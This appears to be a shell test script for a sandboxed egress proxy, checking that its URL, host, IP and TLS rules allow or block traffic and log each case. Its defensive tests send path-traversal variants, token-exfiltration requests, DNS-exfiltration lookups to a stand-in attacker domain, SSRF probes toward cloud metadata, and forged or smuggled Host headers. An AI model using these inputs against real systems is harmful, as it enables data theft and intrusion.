#!/bin/sh
# proxy-engine: inspect in restrict mode, run inside the cage against the
# fixture origins and the rules the test runs the proxy with. What the proxy
# logged and reported for this traffic is asserted afterwards, outside the
# cage, so the requests below are kept as they are even where the status alone
# would pass.
set -u
# shellcheck source-path=SCRIPTDIR
. "$(dirname "$0")/lib.sh"

# The proxy's CA is in the system store, so a request it terminates needs no
# --insecure. The passthrough cases need it, as does the forged-Host case,
# whose address URL names no host the certificate could match; the SSRF cases
# pass it so that only the status decides them.
#
# `S` prints the body, `C` the status. A test asserts on both: a 200 that
# returned the wrong resource is a failure the status alone would hide.
S="curl -sS --max-time 10"
C="curl -sS -o /dev/null -w %{http_code} --max-time 10"
# --path-as-is stops curl resolving the path itself, so the proxy is what is
# under test.
P="curl -sS -o /dev/null -w %{http_code} --path-as-is --max-time 10"

echo "=== [URL rule - path allowed] ==="
check_ok "GET /public/pkg.tgz" "$($S https://allowed.example.com/public/pkg.tgz)" "PUBLIC GET"

echo "=== [URL rule - path not allowed] ==="
check_status "GET /private/secret" "$($C https://allowed.example.com/private/secret)" "403"

# The same URL that a GET may have. Only the method differs, which is what no
# host-level engine can express.
echo "=== [URL rule - method not allowed] ==="
check_status "POST /public/pkg.tgz" "$($C -X POST https://allowed.example.com/public/pkg.tgz)" "403"

echo "=== [URL rule - method allowed] ==="
check_ok "POST /v1/thing" "$($S -X POST https://api.example.com/v1/thing)" "API POST"

# Without normalization the proxy matches /public/ and the origin serves
# /private/, so a 200 carrying PRIVATE is the failure to catch here.
echo "=== [Traversal] ==="
check_status "GET /public/../private/secret" "$($C https://allowed.example.com/public/../private/secret)" "403"

# RFC 9112 section 3.2.4's asterisk-form, which asks about the server rather
# than about a resource. No path rule can match it, so it is blocked; the
# report has to name the host the request carried rather than one built from
# an empty path.
echo "=== [Request target is not a path] ==="
check_status "OPTIONS *" "$($C -X OPTIONS --request-target '*' https://allowed.example.com/)" "403"

# `.` is unreserved, so `%2e%2e` only becomes a dot-dot segment once decoded.
# Decoding after stripping would leave it intact, and this would return
# PRIVATE with a 200.
echo "=== [Traversal, encoded] ==="
for p in "%2e%2e/private/secret" "%2e%2e%2fprivate/secret" \
  "%2E%2E%2Fprivate/secret" "..%2fprivate/secret"; do
  check_status "GET /public/$p" "$($P "https://allowed.example.com/public/$p")" "403"
done

# Raw or encoded, a backslash can climb on an origin that honours it. curl with
# --path-as-is sends it literally; a conforming client would send `/` instead.
echo "=== [Traversal, backslash] ==="
for p in "x/..%5c../private/secret" "x/%2e%2e%5cprivate/secret" \
  "x/..\\../private/secret" "x/\\..\\../private/secret"; do
  check_status "GET /public/$p" "$($P "https://allowed.example.com/public/$p")" "403"
done

# Tomcat and Jetty read `..;/` as `../`. This origin does not, so the 403 is
# what is under test.
echo "=== [Traversal, path parameter] ==="
for p in "..;/private/secret" "..%3b/private/secret" "..%3B/private/secret" \
  "..;jsessionid=x/private/secret" "%2e%2e;/private/secret"; do
  check_status "GET /public/$p" "$($P "https://allowed.example.com/public/$p")" "403"
done

# An encoded slash on its own is how npm asks for a scoped package, a name
# may simply contain dots, and a segment may carry a parameter.
echo "=== [Not traversal] ==="
for p in "@scope%2fpkg" "my..pkg" "pkg.tgz" "a%5cb" "pkg;v=1"; do
  check_ok "GET /public/$p" "$(curl -sS --path-as-is --max-time 10 "https://allowed.example.com/public/$p")" "PUBLIC"
done

# Nothing declares 9443 as TLS. Reaching the origin there proves both that the
# listener classified it by content and that the original port survived to the
# origin connection.
echo "=== [Non-standard TLS port 9443] ==="
check_ok "GET :9443/public/pkg.tgz" "$($S https://allowed.example.com:9443/public/pkg.tgz)" "PUBLIC GET"

# blocked.example.com is otherwise always blocked (see [Blocked host] below),
# so reaching it here proves the ~regex rule itself granted access.
echo "=== [Regex URL rule - host, port and path all matched] ==="
check_ok "GET blocked.example.com:9443/public/pkg.tgz" "$($S https://blocked.example.com:9443/public/pkg.tgz)" "PUBLIC GET"

echo "=== [Regex URL rule - path not allowed] ==="
check_status "GET blocked.example.com:9443/private/secret" "$($C https://blocked.example.com:9443/private/secret)" "403"

# Same host and path, default port instead of the rule's 9443: a ~regex rule
# that failed to carry its port into a real restriction would wrongly let
# this through as "any port".
echo "=== [Regex URL rule - default port not covered by the literal-port rule] ==="
check_status "GET blocked.example.com/public/pkg.tgz" "$($C https://blocked.example.com/public/pkg.tgz)" "403"

# A separate ~regex rule on blocked.example.com, /defaultport/ this time,
# names no port at all. It must match the default port (443) and nothing
# else: a bare/full check that always resolved "true" would wrongly let
# 9443 through too.
echo "=== [Regex URL rule - no port names the default port only] ==="
check_ok "GET blocked.example.com/defaultport/pkg.tgz" "$($S https://blocked.example.com/defaultport/pkg.tgz)" "ROOT GET"

echo "=== [Regex URL rule - portless rule does not also grant a non-default port] ==="
check_status "GET blocked.example.com:9443/defaultport/pkg.tgz" "$($C https://blocked.example.com:9443/defaultport/pkg.tgz)" "403"

echo "=== [Regex URL rule - host anchored, path left open] ==="
check_ok "GET ok.wildcard.example.com/regexpub/deep/pkg.tgz" "$($S https://ok.wildcard.example.com/regexpub/deep/pkg.tgz)" "ROOT GET"

echo "=== [Regex URL rule - neighbouring host blocked] ==="
check_status "GET not-ok.wildcard.example.com/regexpub/pkg.tgz" "$($C https://not-ok.wildcard.example.com/regexpub/pkg.tgz)" "403"

echo "=== [Regex URL rule - author's trailing anchor honoured] ==="
check_ok "GET ok.wildcard.example.com/regexexact" "$($S https://ok.wildcard.example.com/regexexact)" "ROOT GET"

echo "=== [Regex URL rule - longer path not covered by the anchored rule] ==="
check_status "GET ok.wildcard.example.com/regexexactly" "$($C https://ok.wildcard.example.com/regexexactly)" "403"

echo "=== [Host rule] ==="
check_ok "DELETE sub.wildcard.example.com" "$($S -X DELETE https://sub.wildcard.example.com/anything/at/all)" "ROOT DELETE"

# attacker.wildcard.example.com matches only the wildcard host, never the
# literal sub.wildcard.example.com rule above, so this is covered solely by
# the path-restricted URL rule. The resolver cannot see the path, so only its
# log proves the name was never actually looked up.
echo "=== [Wildcard host, path outside the rule] ==="
check_status "GET attacker.wildcard.example.com/private/secret" "$($C https://attacker.wildcard.example.com/private/secret)" "403"

echo "=== [Wildcard host, path allowed] ==="
check_ok "GET attacker.wildcard.example.com/public/pkg.tgz" "$($S https://attacker.wildcard.example.com/public/pkg.tgz)" "PUBLIC GET"

echo "=== [Plaintext host rule] ==="
check_ok "GET http://allowed.example.com/public/pkg.tgz" "$($S http://allowed.example.com/public/pkg.tgz)" "PUBLIC GET"

# The query string carries the payload an exfiltration attempt would use, and
# keeping it is the point: the log has to record it verbatim.
echo "=== [Blocked host] ==="
check_status "GET blocked.example.com/exfil?token=..." "$($C "https://blocked.example.com/exfil?token=SECRET-VALUE")" "403"

# A release asset's signed URL runs to about a kilobyte, past the length
# haproxy cuts a log line at by default. The marker is last on the logged line,
# so finding it proves the whole line was recorded.
echo "=== [Blocked host, long URL] ==="
PAD=$(awk 'BEGIN{s="";while(length(s)<1200)s=s "A";print s}')
check_status "GET blocked.example.com/exfil?pad=<1.2KB>&end=TAIL-MARKER" \
  "$($C "https://blocked.example.com/exfil?pad=$PAD&end=TAIL-MARKER")" "403"

# The cases below each wait out the proxy's retries, seconds apiece, so they
# run alongside the rest and are checked at the end.
SLOW=$(mktemp -d)

# Allowlisted and resolvable, with nothing listening there. The connection
# never completes, so no certificate is ever accepted on it, and it has to be
# reported as a block rather than as an outage.
echo "=== [Origin connection never completes] (checked at the end) ==="
$C https://deadend.example.com/ > "$SLOW/deadend-https" &

# The same host over plaintext, where no certificate was ever going to be
# checked. That one is an outage and nothing more.
echo "=== [Plaintext origin connection never completes] (checked at the end) ==="
$C http://deadend.example.com/ > "$SLOW/deadend-http" &

# The resolver in the cage answers every name with the proxy's own address, so
# the request reaches the proxy: its own resolution against the real upstream
# is what fails here, refusing rather than falling back to any address.
echo "=== [Name does not resolve] (checked at the end) ==="
$C https://absent.example.com/ > "$SLOW/absent" &

# Allowlisted and resolvable, but the origin's certificate is signed by nobody
# the proxy trusts, so it blocks the connection rather than reach an origin it
# cannot authenticate.
echo "=== [Origin certificate not trusted] (checked at the end) ==="
$C https://impostor.example.com/ > "$SLOW/impostor" &

# Refused like an absent name, and on every attempt rather than sometimes.
echo "=== [Name has AAAA records only] (checked at the end) ==="
$C https://v6only.example.com/ > "$SLOW/v6only" &

# The resolver answers it locally, so the cage cannot learn its real address;
# the request lands on the proxy and is blocked there with its URL recorded.
echo "=== [Name outside the allowlist] ==="
check_status "GET notallowed.example.com" "$($C https://notallowed.example.com/)" "403"

# A client that completes the handshake and then leaves without sending a
# request. IMAP waits for the server to speak first, so curl holds the
# connection open until it times out (exit 28), like any server-first protocol
# on an intercepted port. It is reported as neither allowed nor blocked.
# Closing right after the handshake instead would race the proxy's session
# tickets.
echo "=== [Client leaves before sending a request] ==="
curl -sS -o /dev/null --max-time 5 imaps://aborted.example.com:443/
check_status "IMAPS aborted.example.com (curl exit)" "$?" "28"

# Bytes that are not an HTTP request, on a port no allowed-ip-rules or
# allowed-tls-rules entry covers: anything that is not a TLS handshake reaches
# the plain stage, which reads it as a request and blocks it. nc rather than
# curl, which can only speak protocols it knows. The sleep holds stdin open so
# the FIN does not race the parse and flip the logged ts=PR to ts=CR.
echo "=== [Not an HTTP request at all] ==="
( (printf 'NOT-HTTP\r\n\r\n'; sleep 1) | nc -w 5 10.200.0.100 5432 > /dev/null 2>&1 || true) &
echo "  bytes sent (a blocked row expected in the report)"

# A request that parsed and named no host. `-H 'Host:'` drops the header, and
# HTTP/1.0 is the version that does not require one, so this reaches the
# stage's own rules rather than haproxy's request parser.
echo "=== [Request with no Host header] ==="
check_status "GET /public/pkg.tgz with no Host" "$($C --http1.0 -H 'Host:' http://allowed.example.com/public/pkg.tgz)" "400"

# Aimed at the impostor by address while claiming an allowed name. The proxy
# resolves the name itself, so the allowed origin answers and the impostor is
# never reached.
echo "=== [Forged Host] ==="
OUT=$($S --insecure -H 'Host: allowed.example.com' https://10.200.0.101/public/pkg.tgz)
case "$OUT" in
  PUBLIC\ GET*) pass "forged Host reached the resolved origin" ;;
  IMPOSTOR*) fail "forged Host reached the address the client chose" ;;
  *) fail "forged Host did not reach the resolved origin -- got: $OUT" ;;
esac

# Judged on SNI alone and never decrypted, so the client validates the origin's
# own self-signed certificate: --insecure here is the assertion, not a
# workaround. A decrypted connection would present the proxy's CA instead,
# which the system store already trusts.
echo "=== [TLS passthrough] ==="
check_ok "GET tlspass.example.com (passthrough)" "$($S --insecure https://tlspass.example.com/public/x)" "PUBLIC GET"

# Same host as [TLS passthrough], a second port only the ~regex rule names.
echo "=== [Regex TLS rule] ==="
check_ok "GET tlspass.example.com:8443 (passthrough)" "$($S --insecure https://tlspass.example.com:8443/public/x)" "PUBLIC GET"

echo "=== [SNI holding a colon] ==="
(sni_colon_hello \
  | nc -w 5 allowed.example.com 443 > /dev/null 2>&1 || true)
echo "  sent (no passthrough expected in the report)"

# SNI = abandoned.example.com, offering no cipher suite the proxy shares, so the
# proxy refuses the handshake.
echo "=== [Client TLS handshake fails] ==="
( (printf '\026\003\001\000\115\001\000\000\111\003\003\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\002\000\377\001\000\000\036\000\000\000\032\000\030\000\000\025\141\142\141\156\144\157\156\145\144\056\145\170\141\155\160\154\145\056\143\157\155'; sleep 1) \
  | nc -w 5 allowed.example.com 443 > /dev/null 2>&1 || true) &
echo "  sent (a client-tls-failed row expected in the report)"

echo "=== [Host holding a colon] ==="
check_status "Host anyport.example.com:x.evil.example.net:80" \
  "$($C -H 'Host: anyport.example.com:x.evil.example.net:80' http://allowed.example.com/public/x)" "400"

# No connection is ever made, so the resolver's log is the only record. The
# lookup is expected to fail; what matters is that it was blocked and recorded.
echo "=== [DNS-only exfiltration] ==="
nslookup SECRET-IN-A-NAME.attacker.example > /dev/null 2>&1 || true
echo "  queried (a blocked name expected in the report)"

# apt asks for this on every repository it fetches from, and falls back to the
# plain name when nothing comes back. The lookup works; reporting it as blocked
# would fail a run that went fine.
echo "=== [Service discovery, host allowed] ==="
nslookup -type=SRV _http._tcp.allowed.example.com > /dev/null 2>&1 || true
echo "  queried (no blocked row expected in the report)"

# Prefixing `_a._tcp.` must not be a way out of the report, so the verb above
# is held to names under a host the rules allow.
echo "=== [Service discovery, host not allowed] ==="
nslookup -type=SRV _mongodb._tcp.SECRET-IN-A-NAME.attacker.example > /dev/null 2>&1 || true
echo "  queried (a blocked name expected in the report)"

# Nothing in the cage has a name, so the only question is how the lookup ends.
# A query the resolver leaves unhandled is answered SERVFAIL, which musl reads
# as a server that may yet answer: it retries and then waits out its whole
# five-second timeout, once for every tool that reverse-resolves its own
# address or the gateway's. NXDOMAIN is final and costs nothing.
echo "=== [Reverse lookup] ==="
OUT=$(nslookup 198.19.255.1 2>&1 || true)
case "$OUT" in
  *NXDOMAIN*) pass "the reverse lookup was refused outright" ;;
  *) fail "the reverse lookup was not answered NXDOMAIN -- got: $OUT" ;;
esac

# Only a name that is an address backwards counts as a reverse lookup. The verb
# those are logged under is one the report drops, so appending `.in-addr.arpa`
# to an exfiltration name must not be a way out of the report.
echo "=== [Reverse zone, invented name] ==="
nslookup SECRET-IN-A-NAME.in-addr.arpa > /dev/null 2>&1 || true
echo "  queried (a blocked name expected in the report)"

# No resolver can answer an address, so the proxy takes one in the Host header
# as it stands rather than asking. Without that a rule naming an address could
# never be satisfied, and the only way to reach one would be the uninspected
# passthrough of allowed-ip-rules.
echo "=== [Address in a URL rule] ==="
check_ok "GET http://10.200.0.100/pub-by-addr/x" "$($S http://10.200.0.100/pub-by-addr/x)" "ROOT GET"

# The path rule still applies, which is why this is not passed through
# uninspected.
echo "=== [Address, path outside the rule] ==="
check_status "GET http://10.200.0.100/private/secret" "$($C http://10.200.0.100/private/secret)" "403"

# Not an address, however much it looks like one. Each falls through to the
# resolver, which cannot answer it either.
echo "=== [Address-shaped but invalid] ==="
for h in 999.1.2.3 010.0.0.1 1.2.3.4.evil.example; do
  check_status "GET http://$h/pub-by-addr/x" \
    "$($C --resolve "$h:80:10.200.0.100" "http://$h/pub-by-addr/x")" "403"
done

# The client sends nothing and waits for the server to speak. The greeting
# arrives within 3s only if the passthrough does not wait out inspect-delay
# (5s) for the client's first bytes.
echo "=== [Direct IP - allowed, server speaks first] ==="
OUT=$(greeting 10.200.0.100 2525 3)
case "$OUT" in
  220\ *) pass "10.200.0.100:2525 greeted without waiting for the client" ;;
  *) fail "10.200.0.100:2525 sent no greeting within 3s -- got: $OUT" ;;
esac

# Port 9080, distinct from the :80 the URL rule above already allows, so
# reaching it proves this ~regex allowed-ip-rules entry's own doing.
echo "=== [Regex IP rule] ==="
check_ok "GET http://10.200.0.100:9080/anything" "$($S http://10.200.0.100:9080/anything)" "ROOT GET"

# Same address on 8080, which no rule names: blocking it proves the ~regex ip
# rule's own literal port (9080) is enforced, not "any port".
echo "=== [Regex IP rule - other port not covered] ==="
check_status "GET http://10.200.0.100:8080/anything" "$($C http://10.200.0.100:8080/anything)" "403"

# What a resolver does when a UDP answer comes back truncated. The gateway's
# :53 is the cage's own resolver; any other is judged by allowed-ip-rules like
# any other address. The reply opens with its length, then the query's own id.
for r in 198.19.255.1 10.200.0.53; do
  echo "=== [DNS over TCP - $r] ==="
  ID=$(reply_head 4 "$r" 53 '\000\035\253\315\001\000\000\001\000\000\000\000\000\000\007example\003com\000\000\001\000\001' | cut -c5-8)
  check_status "a TCP lookup at $r was answered (query id)" "$ID" "abcd"
done

# metadata.example.com is allowlisted but resolves to 169.254.169.254. The name
# passes the rules; the resolved address must not. Without the guard the proxy
# would fetch cloud metadata and hand it back.
echo "=== [SSRF via allowlisted name] ==="
check_status "GET metadata.example.com (resolves to 169.254.169.254)" "$($C --insecure https://metadata.example.com/latest/meta-data)" "403"

# Allowlisted, but resolves to an address HOST_ADDRESSES names as the runner's.
# RFC1918 is exempt on purpose, so only that list blocks it.
echo "=== [SSRF back to the runner] ==="
check_status "GET runner.example.com (resolves to an address the runner holds)" "$($C --insecure https://runner.example.com/)" "403"

echo "=== [Direct address] ==="
check_status "GET http://10.200.0.101/ (impostor, no rule)" "$($C http://10.200.0.101/)" "403"

# The cage forwards nothing, so nothing leaves over UDP: no QUIC, no HTTP/3, no
# DNS to a resolver of its own choosing. The same probe is run from beside the
# echo server, where it must succeed, so a silent fixture cannot pass for
# enforcement.
echo "=== [UDP] (checked at the end) ==="
(echo probe | nc -u -w 3 10.200.0.102 9999 > "$SLOW/udp" 2> /dev/null || true) &

# Port 53 is the only UDP the gateway accepts, and only to itself.
echo "=== [DNS still resolves] ==="
if nslookup allowed.example.com > /dev/null 2>&1; then
  pass "DNS still resolves"
else
  fail "DNS lookup failed"
fi

echo "=== [ICMP] ==="
if ping -c 1 -W 2 10.200.0.100 > /dev/null 2>&1; then
  fail "ping left the cage"
else
  pass "ping did not leave the cage"
fi

wait
echo "=== [The cases run alongside the rest] ==="
check_status "GET deadend.example.com" "$(cat "$SLOW/deadend-https")" "503"
check_status "GET http://deadend.example.com" "$(cat "$SLOW/deadend-http")" "503"
check_status "GET absent.example.com" "$(cat "$SLOW/absent")" "502"
check_status "GET impostor.example.com" "$(cat "$SLOW/impostor")" "503"
check_status "GET v6only.example.com" "$(cat "$SLOW/v6only")" "502"
if [ -s "$SLOW/udp" ]; then
  fail "UDP left the cage: got reply [$(cat "$SLOW/udp")]"
else
  pass "UDP to the echo server got no reply"
fi
rm -rf "$SLOW"

scenario_results "inspect restrict scenarios"
